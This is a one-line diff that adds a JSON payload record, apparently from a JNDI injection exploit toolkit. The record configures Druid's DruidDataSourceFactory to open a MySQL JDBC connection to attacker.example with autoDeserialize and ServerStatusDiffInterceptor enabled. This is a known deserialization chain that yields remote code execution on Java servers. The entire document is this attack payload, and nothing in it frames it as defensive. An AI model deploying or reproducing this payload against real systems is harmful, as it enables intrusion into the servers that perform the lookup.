@@ -1,0 +1,1 @@
+{"attack_type":"jndi_factory","factory_class":"com.alibaba.druid.pool.DruidDataSourceFactory","reference_class":"javax.sql.DataSource","factory_attrs":{"url":"jdbc:mysql://attacker.example/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor","driverClassName":"com.mysql.cj.jdbc.Driver","init":"true","initialSize":"0"}}
